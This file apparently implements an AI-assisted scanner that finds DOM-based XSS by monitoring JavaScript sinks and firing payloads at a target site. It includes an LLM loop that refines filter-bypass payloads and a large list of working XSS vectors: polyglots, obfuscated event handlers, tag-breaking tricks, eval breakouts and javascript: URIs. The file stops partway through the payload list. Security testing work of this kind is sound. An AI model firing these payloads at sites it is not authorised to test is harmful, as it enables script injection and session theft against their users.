#!/usr/bin/env python3
"""
DOM-Based XSS Detection Agent

This agent detects DOM-based XSS vulnerabilities by:
1. Monitoring JavaScript sources (user-controllable input)
2. Tracking data flow to dangerous sinks
3. Using AI to generate context-aware DOM XSS payloads
4. Detecting client-side JavaScript vulnerabilities
"""

import asyncio
import json
import logging
import os
import re
import sys
from dataclasses import dataclass, asdict
from datetime import datetime
from pathlib import Path
from typing import List, Dict, Any, Optional, Set
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote

from playwright.async_api import async_playwright, Page, Browser, ConsoleMessage

# Add parent directory to path for IntelligentAgent import
sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))
from utils.intelligent_agent import IntelligentAgent


@dataclass
class DOMSource:
    """Represents a DOM XSS source (user input)"""
    source_type: str  # location.hash, location.search, postMessage, etc.
    parameter: Optional[str] = None
    value: Optional[str] = None
    location: str = ""  # Where in the page this source is read


@dataclass
class DOMSink:
    """Represents a dangerous DOM sink"""
    sink_type: str  # eval, innerHTML, document.write, etc.
    sink_location: str  # File:line or stack trace
    tainted_value: Optional[str] = None  # The value that reached the sink
    source_trace: List[str] = None  # Chain from source to sink


@dataclass
class DOMXSSVulnerability:
    """Represents a confirmed DOM XSS vulnerability"""
    vulnerability_id: str
    source: DOMSource
    sink: DOMSink
    payload: str
    executed: bool
    execution_evidence: List[str]
    url: str
    timestamp: str
    severity: str  # high, medium, low
    recommendation: str


class DOMXSSAgent(IntelligentAgent):
    """
    Advanced DOM-based XSS detection agent with AI-powered analysis

    Now inherits from IntelligentAgent for smart memory and reasoning integration
    """

    # JavaScript sources that can be controlled by attacker
    SOURCES = {
        'location.href': 'Full URL',
        'location.search': 'Query string',
        'location.hash': 'URL fragment',
        'location.pathname': 'URL path',
        'document.URL': 'Document URL',
        'document.documentURI': 'Document URI',
        'document.referrer': 'HTTP Referer',
        'window.name': 'Window name',
        'document.cookie': 'Cookies',
        'localStorage': 'Local storage',
        'sessionStorage': 'Session storage',
    }

    # Dangerous sinks where untrusted data can cause XSS
    SINKS = {
        # Direct code execution
        'eval': 'Direct JavaScript execution',
        'Function': 'Function constructor',
        'setTimeout': 'Delayed code execution',
        'setInterval': 'Repeated code execution',
        'setImmediate': 'Immediate code execution',

        # DOM manipulation
        'innerHTML': 'HTML injection',
        'outerHTML': 'Outer HTML injection',
        'document.write': 'Document write',
        'document.writeln': 'Document writeln',
        'insertAdjacentHTML': 'Adjacent HTML injection',

        # jQuery sinks
        '$.html': 'jQuery HTML injection',
        '$.append': 'jQuery append',
        '$.prepend': 'jQuery prepend',
        '$.after': 'jQuery after',
        '$.before': 'jQuery before',
        '$.replaceWith': 'jQuery replace',

        # Location sinks
        'location.href': 'Location navigation',
        'location.assign': 'Location assign',
        'location.replace': 'Location replace',

        # React sinks
        'dangerouslySetInnerHTML': 'React dangerous HTML',

        # Vue sinks
        'v-html': 'Vue HTML directive',

        # Angular sinks
        'bypassSecurityTrust*': 'Angular security bypass',
    }

    def __init__(self, memory_manager=None, reasoning_tracker=None, reasoning_session_id=None):
        # Initialize IntelligentAgent base class (for memory and reasoning)
        super().__init__(memory_manager, reasoning_tracker, reasoning_session_id)

        self.logger = logging.getLogger(self.__class__.__name__)
        self.detected_sources = []
        self.detected_sinks = []
        self.vulnerabilities = []

        # Try to import AI client
        try:
            import sys
            from pathlib import Path
            sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))
            from ..llm_client import get_llm_client
            self.ai_client = get_llm_client()
            self.has_ai = True
        except Exception as e:
            self.logger.warning(f"AI client not available - using fallback payloads: {e}")
            self.has_ai = False
            self.ai_client = None

    async def detect_dom_xss(self, target_url: str, proxy_agent=None) -> List[DOMXSSVulnerability]:
        """
        Main entry point for DOM XSS detection

        Args:
            target_url: URL to test
            proxy_agent: Optional proxy for traffic capture

        Returns:
            List of detected DOM XSS vulnerabilities
        """
        self.logger.info(f"Starting DOM XSS detection on {target_url}")

        # Announce scan start with memory insights (if memory enabled)
        if self.memory:
            self.announce_scan_start(target_url)

        vulnerabilities = []

        # Phase 1: Analyze page for sources and sinks
        analysis = await self._analyze_page_javascript(target_url, proxy_agent)

        # If no sinks but parameters found, follow form actions
        if not analysis['sinks'] and analysis['parameters']:
            self.logger.info("No sinks on landing page, checking form targets...")
            form_targets = await self._get_form_targets(target_url, proxy_agent)

            for form_target in form_targets:
                self.logger.info(f"Testing form target: {form_target}")
                form_analysis = await self._analyze_page_javascript(form_target, proxy_agent)

                # Merge parameters from both pages
                form_analysis['parameters'].extend(analysis['parameters'])

                if form_analysis['sinks']:
                    analysis = form_analysis
                    target_url = form_target  # Update target to form action
                    break

        if not analysis['sources'] and not analysis['sinks']:
            self.logger.info("No DOM sources or sinks detected")
            return vulnerabilities

        self.logger.info(f"Detected {len(analysis['sources'])} sources and {len(analysis['sinks'])} sinks")

        # Phase 2: Generate AI-powered test payloads based on detected sources/sinks
        test_vectors = await self._generate_dom_test_vectors(target_url, analysis)

        # Phase 3: Test each vector
        for vector in test_vectors:
            payload = vector.get('payload', '')

            # Check memory - skip if already tested successfully
            if self.memory:
                should_test, reason = self.should_test_payload(payload, "dom_xss")
                if not should_test:
                    self.logger.info(f"⏭️ Skipping payload (memory): {reason}")
                    continue

            self.logger.info(f"Testing DOM XSS vector: {vector['source']} -> {vector['sink']}")

            # Log action with reasoning
            if self.reasoning:
                self._log_action(
                    f"Testing {vector['source']} -> {vector['sink']} with payload",
                    payload=payload,
                    strategy=f"{vector['source']}_to_{vector['sink']}"
                )

            vuln = await self._test_dom_vector(
                target_url,
                vector,
                proxy_agent
            )

            if vuln:
                vulnerabilities.append(vuln)
                self.logger.info(f"✓ DOM XSS confirmed: {vector['source']} -> {vector['sink']}")

                # Remember successful payload in memory
                if self.memory:
                    self.remember_test_result(
                        payload=payload,
                        payload_type="dom_xss",
                        strategy=f"{vector['source']}_to_{vector['sink']}",
                        success=True,
                        transformation=None,
                        detected_filter=None,
                        confidence=0.95
                    )

                # Log result with reasoning
                if self.reasoning:
                    self._log_result(
                        f"DOM XSS confirmed: {vector['source']} -> {vector['sink']}",
                        success=True,
                        transformation=None,
                        detected_filter=None
                    )
            else:
                # Payload failed - remember and try to detect why
                if self.memory:
                    # Could add filter detection here if needed
                    self.remember_test_result(
                        payload=payload,
                        payload_type="dom_xss",
                        strategy=f"{vector['source']}_to_{vector['sink']}",
                        success=False,
                        transformation=None,
                        detected_filter=None,  # Could enhance with actual filter detection
                        confidence=0.5
                    )

                # Log failed result
                if self.reasoning:
                    self._log_result(
                        f"Payload did not execute: {vector['source']} -> {vector['sink']}",
                        success=False,
                        transformation=None,
                        detected_filter=None
                    )

        # Phase 4: If no vulns found and AI available, use iterative refinement
        if not vulnerabilities and self.has_ai and self.ai_client:
            self.logger.info("No vulnerabilities found with standard payloads. Starting adaptive LLM analysis...")
            refined_vulns = await self._iterative_llm_refinement(
                target_url,
                analysis,
                test_vectors,
                proxy_agent,
                max_iterations=5  # Increased for adaptive response-based testing
            )
            vulnerabilities.extend(refined_vulns)

        # Announce scan completion with summary (if memory enabled)
        if self.memory:
            self.announce_scan_complete()

        return vulnerabilities

    async def _get_form_targets(self, target_url: str, proxy_agent=None) -> List[str]:
        """
        Get all form action URLs from the page
        """
        from urllib.parse import urljoin

        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            context_options = {}
            if proxy_agent and proxy_agent.running:
                context_options['proxy'] = {'server': proxy_agent.get_proxy_url()}

            context = await browser.new_context(**context_options)
            page = await context.new_page()

            try:
                await page.goto(target_url, wait_until='networkidle', timeout=30000)

                # Get all form actions
                form_actions = await page.evaluate("""
                    Array.from(document.forms).map(form => {
                        const action = form.getAttribute('action') || window.location.pathname;
                        return action;
                    })
                """)

                # Convert relative URLs to absolute
                absolute_urls = []
                for action in form_actions:
                    if action:
                        absolute_url = urljoin(target_url, action)
                        # Don't add test parameters - let the vector testing handle that
                        # This ensures proper parameter names are used based on discovery
                        absolute_urls.append(absolute_url)

                return absolute_urls

            except Exception as e:
                self.logger.error(f"Error getting form targets: {e}")
                return []
            finally:
                await browser.close()

    async def _analyze_page_javascript(self, target_url: str, proxy_agent=None) -> Dict[str, Any]:
        """
        Analyze page JavaScript to detect sources and sinks
        """
        analysis = {
            'sources': [],
            'sinks': [],
            'frameworks': [],
            'javascript_files': [],
            'inline_scripts': [],
            'parameters': []
        }

        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)

            # Configure context
            context_options = {}
            if proxy_agent and proxy_agent.running:
                context_options['proxy'] = {'server': proxy_agent.get_proxy_url()}

            context = await browser.new_context(**context_options)
            page = await context.new_page()

            # Storage for detected items
            detected_sources = []
            detected_sinks = []

            # Inject monitoring script BEFORE page loads
            await page.add_init_script(self._get_sink_monitor_script())

            try:
                # Navigate to page
                await page.goto(target_url, wait_until='domcontentloaded', timeout=30000)

                # Wait for scripts to execute and capture sinks
                await page.wait_for_timeout(3000)

                # Also do static analysis of inline scripts
                static_sinks = await self._static_sink_analysis(page)

                # Check for detected sinks from monitoring
                sink_data = await page.evaluate('window.__xss_sinks__ || []')

                # Merge static analysis sinks
                for static_sink in static_sinks:
                    detected_sinks.append(static_sink)

                # Deduplicate sinks and filter false positives
                seen_types = set()
                final_sinks = []

                # Add static sinks first (they're more reliable)
                for sink in detected_sinks:
                    if sink.sink_type not in seen_types:
                        seen_types.add(sink.sink_type)
                        final_sinks.append(sink)

                # Then add runtime detected sinks
                for sink in sink_data:
                    sink_type = sink.get('type', 'unknown')
                    location = sink.get('location', '')

                    # Filter out false positives from Playwright/browser internals
                    if 'UtilityScript' in location or '<anonymous>' in location:
                        continue

                    if sink_type not in seen_types:
                        seen_types.add(sink_type)
                        final_sinks.append(DOMSink(
                            sink_type=sink_type,
                            sink_location=location[:200],  # Limit stack trace
                            tainted_value=sink.get('value', '')[:100] if sink.get('value') else None,
                            source_trace=sink.get('trace', [])
                        ))

                detected_sinks = final_sinks

                # Detect sources by checking if they contain controllable data
                sources_found = await self._detect_sources_in_page(page, target_url)
                detected_sources.extend(sources_found)

                # Detect frameworks
                frameworks = await self._detect_frameworks(page)

                # Get JavaScript files
                js_files = await page.evaluate("""
                    Array.from(document.scripts)
                        .map(s => s.src)
                        .filter(src => src)
                """)

                # Get inline scripts
                inline_scripts = await page.evaluate("""
                    Array.from(document.scripts)
                        .filter(s => !s.src && s.textContent)
                        .map(s => s.textContent.substring(0, 200))
                """)

                # Discover parameters from forms and JavaScript
                discovered_params = await self._discover_parameters(page)

                analysis['sources'] = [asdict(s) for s in detected_sources]
                analysis['sinks'] = [asdict(s) for s in detected_sinks]
                analysis['frameworks'] = frameworks
                analysis['javascript_files'] = js_files
                analysis['inline_scripts'] = inline_scripts
                analysis['parameters'] = discovered_params

            except Exception as e:
                self.logger.error(f"Error analyzing page JavaScript: {e}")
            finally:
                await browser.close()

        return analysis

    def _get_sink_monitor_script(self) -> str:
        """
        Returns JavaScript code to inject into page for sink monitoring
        """
        return """
        (function() {
            window.__xss_sinks__ = [];

            // Monitor eval
            const originalEval = window.eval;
            window.eval = function(code) {
                window.__xss_sinks__.push({
                    type: 'eval',
                    value: code,
                    location: new Error().stack,
                    timestamp: Date.now()
                });
                return originalEval(code);
            };

            // Monitor Function constructor
            const OriginalFunction = window.Function;
            window.Function = function(...args) {
                window.__xss_sinks__.push({
                    type: 'Function',
                    value: args.join(','),
                    location: new Error().stack,
                    timestamp: Date.now()
                });
                return new OriginalFunction(...args);
            };

            // Monitor setTimeout
            const originalSetTimeout = window.setTimeout;
            window.setTimeout = function(code, delay) {
                if (typeof code === 'string') {
                    window.__xss_sinks__.push({
                        type: 'setTimeout',
                        value: code,
                        location: new Error().stack,
                        timestamp: Date.now()
                    });
                }
                return originalSetTimeout(code, delay);
            };

            // Monitor setInterval
            const originalSetInterval = window.setInterval;
            window.setInterval = function(code, delay) {
                if (typeof code === 'string') {
                    window.__xss_sinks__.push({
                        type: 'setInterval',
                        value: code,
                        location: new Error().stack,
                        timestamp: Date.now()
                    });
                }
                return originalSetInterval(code, delay);
            };

            // Monitor innerHTML - save original first to avoid recursion
            const originalInnerHTMLDescriptor = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
            const originalInnerHTMLSetter = originalInnerHTMLDescriptor.set;
            const originalInnerHTMLGetter = originalInnerHTMLDescriptor.get;

            Object.defineProperty(Element.prototype, 'innerHTML', {
                set: function(value) {
                    // Only log if not already in our tracking array (prevent recursion)
                    if (!window.__xss_tracking_innerHTML__) {
                        window.__xss_tracking_innerHTML__ = true;
                        window.__xss_sinks__.push({
                            type: 'innerHTML',
                            value: value,
                            element: this.tagName,
                            location: new Error().stack,
                            timestamp: Date.now()
                        });
                        window.__xss_tracking_innerHTML__ = false;
                    }
                    // Call original setter
                    return originalInnerHTMLSetter.call(this, value);
                },
                get: function() {
                    return originalInnerHTMLGetter.call(this);
                }
            });

            // Monitor document.write
            const originalWrite = document.write;
            document.write = function(content) {
                window.__xss_sinks__.push({
                    type: 'document.write',
                    value: content,
                    location: new Error().stack,
                    timestamp: Date.now()
                });
                return originalWrite.call(document, content);
            };

            // Monitor insertAdjacentHTML
            const originalInsertAdjacentHTML = Element.prototype.insertAdjacentHTML;
            Element.prototype.insertAdjacentHTML = function(position, text) {
                window.__xss_sinks__.push({
                    type: 'insertAdjacentHTML',
                    value: text,
                    position: position,
                    element: this.tagName,
                    location: new Error().stack,
                    timestamp: Date.now()
                });
                return originalInsertAdjacentHTML.call(this, position, text);
            };

            // Monitor jQuery if available
            if (window.jQuery) {
                const originalHtml = jQuery.fn.html;
                jQuery.fn.html = function(value) {
                    if (value !== undefined) {
                        window.__xss_sinks__.push({
                            type: '$.html',
                            value: value,
                            location: new Error().stack,
                            timestamp: Date.now()
                        });
                    }
                    return originalHtml.apply(this, arguments);
                };
            }

            // Monitor location.href setter
            let href = window.location.href;
            Object.defineProperty(window.location, 'href', {
                get: function() { return href; },
                set: function(value) {
                    window.__xss_sinks__.push({
                        type: 'location.href',
                        value: value,
                        location: new Error().stack,
                        timestamp: Date.now()
                    });
                    href = value;
                }
            });

        })();
        """

    async def _detect_sources_in_page(self, page: Page, target_url: str) -> List[DOMSource]:
        """
        Detect DOM sources that are actively used in the page
        """
        sources = []

        # Check each source type
        for source_name, description in self.SOURCES.items():
            try:
                # Check if this source is read in JavaScript
                is_used = await page.evaluate(f"""
                    (function() {{
                        try {{
                            // Check if source exists and has value
                            const source = {source_name};
                            return source !== undefined && source !== null && source !== '';
                        }} catch(e) {{
                            return false;
                        }}
                    }})()
                """)

                if is_used:
                    # Get the value
                    value = await page.evaluate(f"""
                        (function() {{
                            try {{
                                return String({source_name});
                            }} catch(e) {{
                                return null;
                            }}
                        }})()
                    """)

                    sources.append(DOMSource(
                        source_type=source_name,
                        value=value[:200] if value else None,
                        location=description
                    ))

            except Exception as e:
                self.logger.debug(f"Error checking source {source_name}: {e}")

        return sources

    async def _static_sink_analysis(self, page: Page) -> List[DOMSink]:
        """
        Static analysis of JavaScript code to find sinks
        """
        sinks = []

        # Get all inline scripts
        scripts = await page.evaluate("""
            Array.from(document.scripts)
                .filter(s => !s.src && s.textContent)
                .map(s => s.textContent)
        """)

        # Check for common sink patterns
        sink_patterns = {
            'innerHTML': r'\.innerHTML\s*=',
            'outerHTML': r'\.outerHTML\s*=',
            'document.write': r'document\.write\s*\(',
            'eval': r'\beval\s*\(',
            'Function': r'new\s+Function\s*\(',
            'location.href': r'location\.href\s*=',
            'location.assign': r'location\.assign\s*\(',
            'location.replace': r'location\.replace\s*\(',
        }

        # Track which sink types we've found to avoid duplicates
        seen_sinks = set()

        for script_content in scripts:
            for sink_type, pattern in sink_patterns.items():
                # Only add each sink type once across all scripts
                if sink_type not in seen_sinks and re.search(pattern, script_content):
                    sinks.append(DOMSink(
                        sink_type=sink_type,
                        sink_location='static_analysis',
                        tainted_value=None,
                        source_trace=[]
                    ))
                    seen_sinks.add(sink_type)

        return sinks

    async def _discover_parameters(self, page: Page) -> List[Dict[str, str]]:
        """
        Automatically discover parameters from forms and JavaScript
        """
        params = await page.evaluate("""
            (() => {
                const discovered = [];
                const seen = new Set();

                // 1. Find form inputs
                document.querySelectorAll('input[name], select[name], textarea[name]').forEach(input => {
                    const name = input.getAttribute('name');
                    if (name && !seen.has(name)) {
                        seen.add(name);
                        discovered.push({
                            name: name,
                            type: input.type || input.tagName.toLowerCase(),
                            source: 'form_input'
                        });
                    }
                });

                // 2. Find URLSearchParams.get() calls in all scripts
                const allScriptContent = Array.from(document.scripts)
                    .map(s => s.textContent)
                    .join('\\n');

                // Match patterns like: .get('paramName') or .get("paramName")
                const getMatches = allScriptContent.matchAll(/\\.get\\s*\\(\\s*['\"]([^'\"]+)['\"]\\s*\\)/g);
                for (const match of getMatches) {
                    const paramName = match[1];
                    if (!seen.has(paramName)) {
                        seen.add(paramName);
                        discovered.push({
                            name: paramName,
                            type: 'url_parameter',
                            source: 'javascript_code'
                        });
                    }
                }

                // 3. Find direct location.search usage patterns
                const searchMatches = allScriptContent.matchAll(/location\\.search.*['\"]([a-zA-Z0-9_-]+)['\\"]/g);
                for (const match of searchMatches) {
                    const paramName = match[1];
                    if (!seen.has(paramName) && paramName.length > 1) {
                        seen.add(paramName);
                        discovered.push({
                            name: paramName,
                            type: 'url_parameter',
                            source: 'location_search'
                        });
                    }
                }

                // 4. Find indexOf("param=") patterns (common in DOM XSS)
                // Matches: location.href.indexOf("default="), document.location.href.indexOf("id="), etc.
                const indexOfMatches = allScriptContent.matchAll(/indexOf\\s*\\(\\s*['\"]([a-zA-Z0-9_-]+)=[\\'\"]/g);
                for (const match of indexOfMatches) {
                    const paramName = match[1];
                    if (!seen.has(paramName) && paramName.length > 1) {
                        seen.add(paramName);
                        discovered.push({
                            name: paramName,
                            type: 'url_parameter',
                            source: 'indexOf_pattern'
                        });
                    }
                }

                // 5. Find substring patterns that extract URL parameters
                // Matches: .substring(url.indexOf("param")+N)
                const substringMatches = allScriptContent.matchAll(/substring\\s*\\([^)]*indexOf\\s*\\(['\"]([a-zA-Z0-9_-]+)=/g);
                for (const match of substringMatches) {
                    const paramName = match[1];
                    if (!seen.has(paramName) && paramName.length > 1) {
                        seen.add(paramName);
                        discovered.push({
                            name: paramName,
                            type: 'url_parameter',
                            source: 'substring_extraction'
                        });
                    }
                }

                return discovered;
            })()
        """)

        return params

    async def _detect_frameworks(self, page: Page) -> List[str]:
        """
        Detect JavaScript frameworks on the page
        """
        frameworks = await page.evaluate("""
            (function() {
                const detected = [];

                if (window.React) detected.push('React');
                if (window.Vue) detected.push('Vue');
                if (window.angular) detected.push('Angular');
                if (window.jQuery) detected.push('jQuery');
                if (window.Ember) detected.push('Ember');
                if (window.Backbone) detected.push('Backbone');

                return detected;
            })()
        """)

        return frameworks

    async def _generate_dom_test_vectors(self, target_url: str, analysis: Dict) -> List[Dict]:
        """
        Generate test vectors using AI based on detected sources and sinks
        """
        vectors = []

        # If AI is available, use it to generate smart vectors
        if self.has_ai and self.ai_client:
            vectors = await self._ai_generate_vectors(target_url, analysis)
        else:
            # Fallback to template-based vectors
            vectors = self._template_based_vectors(target_url, analysis)

        return vectors

    async def _iterative_llm_refinement(
        self,
        target_url: str,
        analysis: Dict,
        failed_vectors: List[Dict],
        proxy_agent=None,
        max_iterations: int = 5  # Increased for adaptive testing
    ) -> List[DOMXSSVulnerability]:
        """
        Iteratively refine payloads using LLM analysis when standard payloads fail
        Uses adaptive testing: analyzes actual responses to understand protections
        """
        vulnerabilities = []

        # Capture page JavaScript for initial analysis
        page_context = await self._capture_page_context(target_url, proxy_agent)

        # Track what we've learned from testing
        adaptive_history = []

        for iteration in range(max_iterations):
            self.logger.info(f"Iteration {iteration + 1}/{max_iterations}: Adaptive analysis and payload generation...")

            # Build adaptive prompt with response analysis
            prompt = self._build_adaptive_refinement_prompt(
                target_url,
                analysis,
                failed_vectors,
                page_context,
                adaptive_history,
                iteration
            )

            try:
                from ..llm_client import get_default_model
                # Get LLM analysis and new payloads
                response = self.ai_client.simple_chat(
                    model=get_default_model(),
                    message=prompt,
                    temperature=0.8  # Higher temp for creative bypass techniques
                )

                if not response or not response.strip():
                    self.logger.error(f"Empty response from LLM in iteration {iteration + 1}")
                    continue

                # Parse response
                cleaned = self._clean_json_response(response)

                if not cleaned or cleaned == "[]":
                    self.logger.error(f"Failed to extract JSON from LLM response in iteration {iteration + 1}")
                    self.logger.debug(f"Raw response: {response[:500]}")
                    continue

                try:
                    refined_vectors = json.loads(cleaned)
                except json.JSONDecodeError as e:
                    self.logger.error(f"JSON decode error in iteration {iteration + 1}: {e}")
                    self.logger.debug(f"Cleaned response: {cleaned[:500]}")
                    continue

                if not isinstance(refined_vectors, list):
                    self.logger.error(f"Expected list of vectors, got {type(refined_vectors)}")
                    continue

                self.logger.info(f"LLM generated {len(refined_vectors)} refined vectors")

                # Test each refined vector with response analysis
                for vector in refined_vectors:
                    self.logger.info(f"Testing refined vector: {vector.get('payload', 'N/A')}")

                    # Test and capture response for analysis
                    vuln, response_analysis = await self._test_dom_vector_with_analysis(
                        target_url,
                        vector,
                        proxy_agent
                    )

                    if vuln:
                        vulnerabilities.append(vuln)
                        self.logger.info(f"✓ Success with refined payload!")
                        return vulnerabilities  # Success, return immediately
                    else:
                        # Record failure WITH response analysis AND delivery method for adaptive learning
                        adaptive_history.append({
                            'iteration': iteration + 1,
                            'payload': vector.get('payload'),
                            'test_url_pattern': vector.get('test_url_pattern', 'query_param'),
                            'source': vector.get('source', 'unknown'),
                            'reasoning': vector.get('reasoning'),
                            'result': 'failed',
                            'response_analysis': response_analysis  # Key improvement!
                        })
                        self.logger.debug(f"Response analysis: {response_analysis.get('summary', 'N/A')}")

                self.logger.info(f"Iteration {iteration + 1} complete. No successful exploitation yet.")

            except Exception as e:
                self.logger.error(f"Error in refinement iteration {iteration + 1}: {e}")
                break

        self.logger.info(f"Completed {max_iterations} iterations without success")

        # Fallback Phase 1: Try template-based encoding bypass vectors (proven working)
        if not vulnerabilities:
            self.logger.info("Trying fallback encoding bypass vectors...")
            fallback_vectors = self._encoding_bypass_templates(analysis)
            for vector in fallback_vectors[:3]:  # Try top 3
                self.logger.info(f"Testing fallback vector: {vector.get('payload')}")
                vuln = await self._test_dom_vector(target_url, vector, proxy_agent)
                if vuln:
                    vulnerabilities.append(vuln)
                    self.logger.info(f"✓ Success with fallback payload!")
                    return vulnerabilities

        # Fallback Phase 2: Try comprehensive payload database
        if not vulnerabilities:
            self.logger.info("Trying comprehensive payload database (100+ vectors)...")
            comprehensive_vectors = self._comprehensive_payload_database(analysis)

            # Intelligently select diverse payloads to test
            # Take samples from different categories
            polyglots = [v for v in comprehensive_vectors if v['sink'] == 'polyglot'][:5]
            event_handlers = [v for v in comprehensive_vectors if 'Event handler' in v['reasoning']][:5]
            obfuscated = [v for v in comprehensive_vectors if 'obfuscation' in v['reasoning'].lower()][:5]
            location_specific = [v for v in comprehensive_vectors if v['sink'] == 'location.href'][:5]
            eval_specific = [v for v in comprehensive_vectors if v['sink'] == 'eval'][:5]

            # Prioritize by most likely to work
            selected_vectors = polyglots + event_handlers + location_specific + eval_specific + obfuscated

            self.logger.info(f"Testing {len(selected_vectors)} diverse payloads from comprehensive database")

            for vector in selected_vectors:
                self.logger.info(f"Testing comprehensive vector: {vector.get('payload')[:50]}...")
                vuln = await self._test_dom_vector(target_url, vector, proxy_agent)
                if vuln:
                    vulnerabilities.append(vuln)
                    self.logger.info(f"✓ Success with comprehensive database payload!")
                    return vulnerabilities

        return vulnerabilities

    def _comprehensive_payload_database(self, analysis: Dict) -> List[Dict]:
        """
        Comprehensive XSS payload database with 100+ vectors
        Inspired by payloadbox/xss-payload-list and real-world testing
        """
        param_names = [p['name'] for p in analysis.get('parameters', [])]
        if not param_names:
            param_names = ['search', 'q', 'query', 'name', 'data', 'input']

        detected_sinks = [s['sink_type'] for s in analysis.get('sinks', [])]

        payloads = []

        # === POLYGLOT PAYLOADS (work across multiple contexts) ===
        polyglots = [
            'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */onerror=alert(1) )//',
            '"><img src=x onerror=alert(1)//',
            '\'><img src=x onerror=alert(1)//',
            '</script><script>alert(1)</script>',
            '\'"</title></style></textarea></script><script>alert(1)</script>',
            'javascript:alert(1)//',
            '"><svg/onload=alert(1)>',
            '\';alert(1)//\\'
        ]

        for payload in polyglots:
            for param in param_names[:2]:  # Test on first 2 params
                payloads.append({
                    'source': 'location.search',
                    'parameter': param,
                    'payload': payload,
                    'sink': 'polyglot',
                    'reasoning': 'Polyglot payload that works across multiple injection contexts',
                    'test_url_pattern': 'query_param'
                })

        # === EVENT HANDLER VARIATIONS ===
        event_handlers = [
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<iframe onload=alert(1)>',
            '<body onload=alert(1)>',
            '<details open ontoggle=alert(1)>',
            '<marquee onstart=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<select onfocus=alert(1) autofocus>',
            '<textarea onfocus=alert(1) autofocus>',
            '<keygen onfocus=alert(1) autofocus>',
            '<video onloadstart=alert(1) src=x>',
            '<audio onloadstart=alert(1) src=x>',
            '<div onpointerenter=alert(1)>hover</div>',
            '<div onanimationstart=alert(1) style="animation:x">',
            '<form onsubmit=alert(1)><input type=submit>',
        ]

        for payload in event_handlers:
            for param in param_names[:1]:
                payloads.append({
                    'source': 'location.search',
                    'parameter': param,
                    'payload': payload,
                    'sink': 'innerHTML',
                    'reasoning': 'Event handler injection for innerHTML sinks',
                    'test_url_pattern': 'query_param'
                })

        # === ALTERNATIVE ALERT FUNCTIONS ===
        alert_alternatives = [
            '<img src=x onerror=prompt(1)>',
            '<img src=x onerror=confirm(1)>',
            '<img src=x onerror=console.log(1)>',
            '<img src=x onerror=window.print()>',
            '<img src=x onerror=window.open()>',
            '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',  # base64: alert(1)
            '<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>',
        ]

        for payload in alert_alternatives:
            for param in param_names[:1]:
                payloads.append({
                    'source': 'location.search',
                    'parameter': param,
                    'payload': payload,
                    'sink': 'innerHTML',
                    'reasoning': 'Alternative to alert() to bypass keyword filters',
                    'test_url_pattern': 'query_param'
                })

        # === OBFUSCATION TECHNIQUES ===
        obfuscated = [
            '<img src=x onerror="\\u0061lert(1)">',  # Unicode
            '<img src=x onerror="\\x61lert(1)">',  # Hex
            '<img src=x onerror="ale\\u0072t(1)">',  # Mixed
            '<img src=x onerror="al\\x65rt(1)">',  # Mixed hex
            '<img src=x onerror=alert`1`>',  # Template literals
            '<img src=x onerror=window["ale"+"rt"](1)>',  # String concat
            '<img src=x onerror=window[atob("YWxlcnQ=")](1)>',  # Base64
            '<img src=x onerror=top[\'alert\'](1)>',
            '<img src=x onerror=self[\'alert\'](1)>',
            '<img src=x onerror=parent[\'alert\'](1)>',
        ]

        for payload in obfuscated:
            for param in param_names[:1]:
                payloads.append({
                    'source': 'location.search',
                    'parameter': param,
                    'payload': payload,
                    'sink': 'innerHTML',
                    'reasoning': 'Character encoding obfuscation to bypass filters',
                    'test_url_pattern': 'query_param'
                })

        # === TAG BREAKING & LESS COMMON TAGS ===
        tag_breaking = [
            '<scr<script>ipt>alert(1)</scr</script>ipt>',
            '<scr\\x00ipt>alert(1)</script>',
            '<<SCRIPT>alert(1);//<</SCRIPT>',
            '<iframe src="javascript:alert(1)">',
            '<object data="javascript:alert(1)">',
            '<embed src="javascript:alert(1)">',
            '<isindex action="javascript:alert(1)">',
            '<form action="javascript:alert(1)"><input type=submit>',
            '<math><mtext></mtext><mglyph/onload=alert(1)></math>',
            '<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>',
        ]

        for payload in tag_breaking:
            for param in param_names[:1]:
                payloads.append({
                    'source': 'location.search',
                    'parameter': param,
                    'payload': payload,
                    'sink': 'innerHTML',
                    'reasoning': 'Tag breaking and uncommon tags to bypass filters',
                    'test_url_pattern': 'query_param'
                })

        # === EVAL/FUNCTION SINK SPECIFIC ===
        if 'eval' in detected_sinks or 'Function' in detected_sinks or 'setTimeout' in detected_sinks:
            eval_payloads = [
                '\');alert(1);//',
                '\';alert(1);//',
                '";alert(1);//',
                '`;alert(1);//',
                '\\n\\ralert(1)//',
                '\\n\\r\\nalert(1)//',
                '\') + alert(1) + (\'',
                '\' + alert(1) + \'',
                '\")) + alert(1) + (("',
                '" + alert(1) + "',
            ]

            for payload in eval_payloads:
                for param in param_names:
                    payloads.append({
                        'source': 'location.search',
                        'parameter': param,
                        'payload': payload,
                        'sink': 'eval',
                        'reasoning': 'String context breakout for eval/Function sinks',
                        'test_url_pattern': 'query_param'
                    })

        # === LOCATION.HREF SINK SPECIFIC ===
        if 'location.href' in detected_sinks or 'location.assign' in detected_sinks:
            location_payloads = [
                'javascript:alert(1)',
                'javascript:alert(document.domain)',
                'javascript:alert(document.cookie)',
                'javascript:alert(1)//https://',
                'javascript:alert(1)/*https://*/',
                'javascript:alert(1)<!--https://',
                'javascript:alert(1)#https://',
                'javascript:alert(1);https://',
                'javas\\x63ript:alert(1)',
                'javas\\u0063ript:alert(1)',
                'java\\0script:alert(1)',
                'JaVaScRiPt:alert(1)',
                'data:text/html,<script>alert(1)</script>',
                'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
                'vbscript:msgbox(1)',  # IE specific
            ]

            for payload in location_payloads:
                for param in param_names:
                    payloads.append({
                        'source': 'location.search',
                        'parameter': param,
                        'payload': payload,
                        'sink': 'location.href',
                        'reasoning': 'Protocol handler exploitation for location sinks',
                        'test_url_pattern': 'query_param'
                    })

        # === HASH/FRAGMENT BASED ===
